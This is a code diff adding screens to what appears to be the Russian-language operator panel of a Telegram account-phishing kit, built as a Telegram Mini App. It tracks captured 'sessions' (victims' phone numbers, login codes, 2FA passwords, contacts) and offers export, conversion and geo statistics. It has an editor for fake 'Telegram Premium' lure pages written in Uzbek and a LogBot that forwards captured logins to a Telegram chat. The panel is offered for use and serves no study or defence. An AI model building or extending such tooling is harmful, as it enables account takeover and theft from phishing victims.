+    <button class="btn" onclick="closeSheet();toast('Фильтр применён')">Применить</button>
+  `);
+}
+
+/* ---- SESSION CARD ---- */
+screens.sessionCard = (p)=>{
+  const s=DATA.sessions.find(x=>x.id===p.id);
+  if(!s) return {title:'Сессия', tab:'sessions', html:`<div class="empty"><div class="ic">∅</div><div class="ttl">Не найдено</div></div>`};
+  const tl=s.timeline||{phone:'14:22:11',code:'14:22:34',twofa:null,done:'14:22:35'};
+  const dt = (a,b)=>{if(!a||!b)return ''; const A=Date.parse('1970-01-01T'+a),B=Date.parse('1970-01-01T'+b); const d=(B-A)/1000; return `(+${d}с)`;};
+  return {
+    title:'Сессия', tab:'sessions',
+    html:`
+      <div class="row between mb-s">
+        <span></span>
+        <button class="btn danger tiny" onclick="confirmSheet('Удалить сессию?','Действие необратимо.',()=>{nav.back();toast('Удалена');},true)"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-trash"/></svg>Удалить</button>
+      </div>
+      <div class="card static">
+        <div style="font-size:17px"><b>📱 ${esc(s.phone)}</b></div>
+        ${s.username?`<div class="t-muted mt-s">${esc(s.username)} · ${esc(s.name||'')}</div>`:''}
+        ${s.tg_id?`<div class="t-muted">TG ID: ${s.tg_id}</div>`:''}
+        ${s.dc?`<div class="t-muted">DC: ${s.dc} ${s.premium?`· ⭐ Premium (до ${s.premium_until||'—'})`:''}</div>`:''}
+      </div>
+      <div class="card static">
+        <div class="row between"><span class="t-label">Статус</span>${statusPill(s.status)}</div>
+        <div class="row between mt-s"><span class="t-label">SpamBlock</span><span>${s.spamblock?'<span class="t-err">❌ есть</span>':'<span class="t-ok">✅ нет</span>'}</span></div>
+      </div>
+      <div class="section-label">Таймлайн lorem</div>
+      <div class="card static">
+        <div class="row between mb-s"><span>📱 Телефон введён</span><span class="t-muted">${tl.phone||'—'}</span></div>
+        <div class="row between mb-s"><span>📨 Код введён ${dt(tl.phone,tl.code)}</span><span class="t-muted">${tl.code||'—'}</span></div>
+        <div class="row between mb-s"><span>🔑 2FA</span><span class="t-muted">${tl.twofa||'—'}</span></div>
+        <div class="row between"><span>✅ Завершено ${dt(tl.code,tl.done)}</span><span class="t-muted">${tl.done||'—'}</span></div>
+      </div>
+      ${s.contacts?`
+      <div class="section-label">Данные аккаунта</div>
+      <div class="card static">
+        <div class="row between mb-s"><span class="t-label">Контакты</span><b class="num">${s.contacts}</b></div>
+        <div class="row between mb-s"><span class="t-label">Диалоги</span><b class="num">${s.dialogs||'—'}</b></div>
+        <div class="row between mb-s"><span class="t-label">Группы</span><b class="num">${s.groups||'—'}</b></div>
+        <div class="row between"><span class="t-label">Каналы</span><b class="num">${s.channels||'—'}</b></div>
+      </div>`:''}
+      <div class="section-label">Источник</div>
+      <div class="card static">
+        <div class="row between mb-s"><span class="t-label">Домен</span><span>${esc(s.domain)}</span></div>
+        <div class="row between mb-s"><span class="t-label">Ссылка</span><span>${esc(s.link)}</span></div>
+        <div class="row between"><span class="t-label">Шаблон</span><span>${esc(s.template||'—')}</span></div>
+      </div>
+      <div class="actbar">
+        <button class="btn ghost small" onclick="toast('Проверка запущена')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-refresh"/></svg>Проверить</button>
+        <button class="btn small" onclick="toast('Экспорт начат')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-send"/></svg>Экспорт</button>
+      </div>
+    `
+  };
+};
+
+/* ---- STATS ---- */
+let STATS_PERIOD='7d', STATS_TAB='funnel';
+screens.stats = ()=>{
+  const f=DATA.stats.funnel;
+  return {
+    title:'Статистика', tab:'stats',
+    html:`
+      <div class="seg">
+        ${[['1d','Сегодня'],['7d','7 дней'],['30d','30 дней'],['all','Всё']].map(([k,v])=>`<div class="s ${STATS_PERIOD===k?'active':''}" onclick="STATS_PERIOD='${k}';nav._render()">${v}</div>`).join('')}
+      </div>
+      <div class="section-label">Общая воронка</div>
+      <div class="card static">${funnelBlock(f)}</div>
+      <div class="seg mt-m">
+        ${[['funnel','Воронка'],['timeline','Таймлайн'],['domains','Домены'],['geo','Гео']].map(([k,v])=>`<div class="s ${STATS_TAB===k?'active':''}" onclick="STATS_TAB='${k}';nav._render()">${v}</div>`).join('')}
+      </div>
+      ${STATS_TAB==='funnel' ? `
+        <div class="section-label">Breakdown</div>
+        <div class="chips">
+          <div class="chip active">По домену</div><div class="chip">По шаблону</div><div class="chip">По ссылке</div><div class="chip">По дню</div>
+        </div>
+        <div class="card static">
+          ${DATA.stats.topDomains.map((d,i)=>`<div class="row between mb-s"><span>${i+1}. ${esc(d.name)}</span><span><span class="t-mag num">${d.done}</span> <span class="t-muted">(${d.conv}%)</span></span></div>`).join('')}
+        </div>
+      ` : ''}
+      ${STATS_TAB==='timeline' ? `
+        <div class="seg">
+          <div class="s">По часам</div><div class="s active">По дням</div><div class="s">По неделям</div>
+        </div>
+        <div class="card static">
+          <div style="color:var(--accent);white-space:pre;line-height:1.2;text-shadow:0 0 8px rgba(0,255,209,.4);font-size:12px">
+800─┬──╮
+400─┤  ╰──╮    ╭──╮
+  0─┤     ╰────╯  ╰────
+    пн  вт  ср  чт  пт  сб  вс</div>
+        </div>
+      ` : ''}
+      ${STATS_TAB==='domains' ? `
+        <div class="card static">
+          ${DATA.stats.topDomains.map((d,i)=>`<div class="row between mb-s"><span>${i+1}. ${esc(d.name)}</span><span>✅ <span class="t-mag num">${d.done}</span> <span class="t-muted">(${d.conv}%)</span></span></div>`).join('')}
+        </div>
+      ` : ''}
+      ${STATS_TAB==='geo' ? `
+        <div class="card static">
+          ${DATA.stats.geo.map(g=>`
+            <div class="funnel-row" style="grid-template-columns:24px 1fr 60px 80px">
+              <span style="font-size:14px">${g.flag}</span>
+              <span class="lbl">${g.code} · ${g.count.toLocaleString('ru')}</span>
+              <span class="val">${g.pct}%</span>
+              <div class="bar"><i style="width:${g.pct*1.6}%"></i></div>
+            </div>`).join('')}
+        </div>
+      ` : ''}
+    `
+  };
+};
+
+/* ---- SETTINGS ---- */
+screens.settings = ()=>{
+  const u=DATA.user;
+  return {
+    title:'Настройки', tab:'settings',
+    html:`
+      <div class="section-label">Аккаунт</div>
+      <div class="card static">
+        <div><b>${esc(u.username)}</b></div>
+        <div class="t-muted mt-s">TG ID: ${u.tg_id}</div>
+      </div>
+      <div class="card" onclick="nav.go('templates')">
+        <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-mask"/></svg>Шаблоны</span><span class="chev">${CHEV}</span></div>
+      </div>
+      <div class="card" onclick="nav.go('notifications')">
+        <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-bell"/></svg>Уведомления</span><span class="chev">${CHEV}</span></div>
+      </div>
+      <div class="card" onclick="nav.go('logbot')">
+        <div class="row between"><span class="row gap-s"><svg class="svgi x18 t-acc"><use href="#ic-send"/></svg>LogBot</span><span class="chev">${CHEV}</span></div>
+      </div>
+    `
+  };
+};
+
+/* ---- TEMPLATES LIST ---- */
+screens.templates = ()=>{
+  return {
+    title:'Шаблоны', tab:'settings',
+    html:`
+      <div class="row between mb-s">
+        <span class="t-label">Управление</span>
+        <button class="btn small" onclick="nav.go('templateEditor',{id:'new'})"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-plus"/></svg>Новый</button>
+      </div>
+      <div class="section-label">Галерея (system, read-only)</div>
+      ${DATA.templates.system.map(t=>`
+        <div class="card static">
+          <div class="row between mb-s">
+            <span class="row gap-s"><svg class="svgi x16 t-acc"><use href="#ic-mask"/></svg><b>${esc(t.name)}</b>${t.def?' <span class="t-muted">(дефолтный)</span>':''}</span>
+            <span class="pill muted">${esc(t.kind)}</span>
+          </div>
+          <div class="t-muted mb-s">нельзя редактировать</div>
+          <div class="row gap-s">
+            <button class="btn ghost small" onclick="toast('Preview')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-eye"/></svg>Preview</button>
+            <button class="btn small" onclick="toast('Клонирован в мои')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-copy"/></svg>Клон</button>
+          </div>
+        </div>
+      `).join('')}
+      <div class="section-label">Мои шаблоны</div>
+      ${DATA.templates.mine.map(t=>`
+        <div class="card" onclick="nav.go('templateEditor',{id:${t.id}})">
+          <div class="row between">
+            <div class="grow">
+              <div class="row gap-s"><svg class="svgi x16 t-mag"><use href="#ic-mask"/></svg><b>${esc(t.name)}</b></div>
+              <div class="t-muted mt-s">${t.domains} доменов · ${t.sessions} сессий${t.weekDelta?` · +${t.weekDelta}/нед`:''}</div>
+            </div>
+            <span class="chev">${CHEV}</span>
+          </div>
+        </div>
+      `).join('')}
+    `
+  };
+};
+
+/* ---- TEMPLATE EDITOR ---- */
+let TPL_PAGE='main';
+screens.templateEditor = (p)=>{
+  const t = p.id==='new'
+    ? {name:'Новый шаблон',pages:{main:{},code:{},twofa:{},done:{}},theme:{body_bg:'#0e1f3d',gradient_from:'#15326e',gradient_to:'#0e1f3d',accent_color:'#3ca1eb',text_color:'#ffffff'}}
+    : DATA.templates.mine.find(x=>x.id===p.id);
+  const page = t.pages[TPL_PAGE]||{};
+  return {
+    title:t.name, tab:'settings',
+    html:`
+      <div class="row gap-s mb-m">
+        <button class="btn ghost small" onclick="toast('Preview')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-eye"/></svg>Preview</button>
+        <button class="btn small" onclick="toast('Сохранено')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-check"/></svg>Save</button>
+      </div>
+      <div class="field-row">
+        <div class="lbl">Название шаблона</div>
+        <input class="input" value="${esc(t.name)}">
+      </div>
+      <div class="seg">
+        ${[['main','Главная'],['code','Код'],['twofa','2FA'],['done','Готово']].map(([k,v])=>`<div class="s ${TPL_PAGE===k?'active':''}" onclick="TPL_PAGE='${k}';nav._render()">${v}</div>`).join('')}
+      </div>
+      <div class="section-label">страница: ${TPL_PAGE}</div>
+      <div class="card static">${renderTplPage(TPL_PAGE,page)}</div>
+      <div class="section-label">Тема оформления</div>
+      <div class="card static">
+        ${themeField('body_bg','Фон страницы',t.theme.body_bg)}
+        ${themeField('gradient_from','Градиент — начало',t.theme.gradient_from)}
+        ${themeField('gradient_to','Градиент — конец',t.theme.gradient_to)}
+        ${themeField('accent_color','Акцентный цвет',t.theme.accent_color)}
+        ${themeField('text_color','Цвет текста',t.theme.text_color)}
+        <div class="hr"></div>
+        <div class="t-label mb-s">Превью темы</div>
+        <div style="background:linear-gradient(180deg,${t.theme.gradient_from},${t.theme.gradient_to});padding:18px 14px;color:${t.theme.text_color};border:1px solid var(--card-border)">
+          <div style="font:18px 'VT323',monospace;margin-bottom:10px">Telegram Premium</div>
+          <div style="background:${t.theme.accent_color};color:${t.theme.body_bg};padding:8px 14px;text-align:center;font-size:12px">ВОЙТИ</div>
+        </div>
+        <button class="btn ghost small mt-m" onclick="toast('Тема сброшена')">🔄 Сбросить тему</button>
+      </div>
+      <div class="actbar">
+        <button class="btn ghost small" onclick="toast('Стадия сброшена')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-refresh"/></svg>Сбросить</button>
+        <button class="btn ghost small" onclick="toast('Дублирован')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-copy"/></svg>Дублировать</button>
+        <button class="btn danger small" onclick="confirmSheet('Удалить шаблон?','Шаблон будет удалён.',()=>{nav.back();toast('Удалён');},true)"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-trash"/></svg>Удалить</button>
+      </div>
+    `
+  };
+};
+
+function renderTplPage(page,data){
+  const f = (key,lbl,ph)=>`
+    <div class="field-row">
+      <div class="lbl">${esc(lbl)}</div>
+      <input class="input" value="${esc(data[key]||'')}" placeholder="${esc(ph||'')}">
+    </div>`;
+  if(page==='main'){
+    return `
+      <div class="field-row">
+        <div class="lbl">Картинка-герой</div>
+        <div class="card static" style="text-align:center;padding:30px 10px">
+          <div class="t-label">[текущее изображение]</div>
+        </div>
+        <div class="row gap-s mt-s">
+          <button class="btn ghost small" onclick="toast('Выбор файла')">📷 Загрузить</button>
+          <button class="btn ghost small" onclick="toast('Сброшено')">🗑 Удалить</button>
+        </div>
+        <div class="field-hint">PNG / JPG / WebP, до 5 MB</div>
+      </div>
+      ${f('h1','Заголовок (h1)','Telegram Premium')}
+      ${f('subtitle','Подзаголовок','Yubileymiz munosabati bilan...')}
+      ${f('phone_label','Метка поля телефона','Telefon raqamingiz:')}
+      ${f('phone_placeholder','Плейсхолдер','90 123 45 67')}
+      ${f('phone_prefix','Префикс','+998')}
+      ${f('button','Текст кнопки','Olish')}
+      ${f('copyright','Копирайт','Barcha huquqlar himoyalangan')}
+      ${f('error_text','Текст ошибки',"Telefon formati noto'g'ri...")}
+    `;
+  }
+  if(page==='code'){
+    return `
+      ${f('h1','Заголовок','Kodni kiriting')}
+      ${f('subtitle','Подзаголовок','Tasdiqlash kodini olish uchun...')}
+      ${f('code_placeholder','Плейсхолдер кода','12345')}
+      ${f('button','Текст кнопки','Davom etish')}
+      ${f('error_text','Текст ошибки','Kodni tekshiring va qayta kiriting.')}
+    `;
+  }
+  if(page==='twofa'){
+    return `
+      ${f('h1','Заголовок','Ikki bosqichli tasdiqlash')}
+      ${f('subtitle','Подзаголовок','Akkauntingizda ikki bosqichli...')}
+      ${f('password_placeholder','Плейсхолдер пароля','••••••••')}
+      ${f('button','Текст кнопки','Tasdiqlash')}
+      ${f('error_text','Текст ошибки',"Parol noto'g'ri. Qayta urinib...")}
+    `;
+  }
+  if(page==='done'){
+    return `
+      ${f('h1','Заголовок','Muvaffaqiyatli!')}
+      ${f('subtitle','Подзаголовок','Siz navbatga muvaffaqiyatli...')}
+    `;
+  }
+  return '';
+}
+
+function themeField(key,lbl,val){
+  return `<div class="field-row">
+    <div class="lbl">${esc(lbl)} (${key})</div>
+    <div class="swatch">
+      <div class="sw" style="background:${val}"></div>
+      <input class="input" value="${val}">
+    </div>
+  </div>`;
+}
+
+/* ---- NOTIFICATIONS ---- */
+screens.notifications = ()=>{
+  return {
+    title:'Уведомления', tab:'settings',
+    html:`
+      <div class="row between mb-s">
+        <span class="t-label">${DATA.notifications.filter(n=>n.unread).length} непрочитанных</span>
+        <button class="btn small ghost" onclick="markAllRead()">Все прочитать</button>
+      </div>
+      ${DATA.notifications.map(n=>`
+        <div class="card" style="${n.unread?'border-left:3px solid var(--accent)':''}" onclick="toast('Открыть источник')">
+          <div class="row gap-s">
+            <svg class="svgi x20 t-${n.color}"><use href="#${n.icId}"/></svg>
+            <div class="grow">
+              <div style="font-size:13px">${esc(n.title)}</div>
+              <div class="t-muted mt-s">${esc(n.sub)}</div>
+            </div>
+          </div>
+        </div>
+      `).join('')}
+    `
+  };
+};
+function markAllRead(){
+  DATA.notifications.forEach(n=>n.unread=false);
+  refreshBellBadge();
+  nav._render();
+  toast('Прочитаны');
+}
+
+/* ---- LOGBOT ---- */
+screens.logbot = ()=>{
+  const lb=DATA.logbot;
+  if(!lb.connected){
+    return {
+      title:'LogBot', tab:'settings',
+      html:`
+        <div class="card static">
+          <div class="row between"><span class="t-label">Статус</span><span class="pill muted">⭕ Не подключён</span></div>
+        </div>
+        <div class="field-row"><div class="lbl">Bot Token</div><input class="input" type="password" placeholder="123456789:AAEhhHg..."></div>
+        <div class="field-row"><div class="lbl">Chat ID</div><input class="input" placeholder="-1001234567890"></div>
+        <button class="btn" onclick="DATA.logbot.connected=true;nav._render();toast('Подключён')">Подключить</button>
+      `
+    };
+  }
+  const TR=[
+    ['done','Сессия завершена (done)'],
+    ['phone','Телефон введён'],
+    ['twofa','2FA запрошена'],
+    ['code','Код введён'],
+    ['bad_code','Неверный код'],
+    ['page','Страница открыта'],
+  ];
+  return {
+    title:'LogBot', tab:'settings',
+    html:`
+      <div class="card static">
+        <div class="row between mb-s"><span class="t-label">Статус</span><span class="pill ok">✅ Подключён</span></div>
+        <div class="row between mb-s"><span class="t-label">Бот</span><span>${esc(lb.name)}</span></div>
+        <div class="row between"><span class="t-label">Чат</span><span class="t-muted">${esc(lb.chat)}</span></div>
+      </div>
+      <div class="section-label">Что отправлять</div>
+      <div class="card static">
+        ${TR.map(([k,lbl])=>`<div class="check ${lb.triggers[k]?'on':''}" onclick="DATA.logbot.triggers['${k}']=!DATA.logbot.triggers['${k}'];nav._render()"><span class="box"></span><span>${esc(lbl)}</span></div>`).join('')}
+      </div>
+      <div class="row gap-s mt-m">
+        <button class="btn ghost small" onclick="toast('Тестовое отправлено')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-send"/></svg>Тест</button>
+        <button class="btn small" onclick="toast('Триггеры сохранены')"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-check"/></svg>Сохранить</button>
+      </div>
+      <button class="btn danger mt-m" onclick="confirmSheet('Отключить LogBot?','Логи больше не будут отправляться.',()=>{DATA.logbot.connected=false;nav._render();toast('Отключён');},true)"><svg class="svgi x14" style="margin-right:6px"><use href="#ic-x"/></svg>Отключить LogBot</button>
+    `
+  };
+};
+
+/* ============ INIT ============ */
+function refreshBellBadge(){
+  const c = DATA.notifications.filter(n=>n.unread).length;
+  const b = $('#bell-badge');
+  if(!b) return;
+  b.textContent = c;
+  b.style.display = c>0 ? 'flex' : 'none';
+}
+
+/* Telegram BackButton — нативная стрелка слева сверху */
+try {
+  const tg = window.Telegram && window.Telegram.WebApp;
+  if (tg){
+    tg.expand && tg.expand();
+    tg.ready && tg.ready();
+    if (tg.BackButton){
+      tg.BackButton.onClick(()=>nav.back());
+      // toggle visibility on every render
+      const origRender = nav._render.bind(nav);
+      nav._render = function(){
+        origRender();
+        if (nav.stack.length>1) tg.BackButton.show();
+        else tg.BackButton.hide();
+      };
+    }
+  }
+} catch(e){}
+
+refreshBellBadge();
+nav._render();
+</script>
+</body>
+</html>
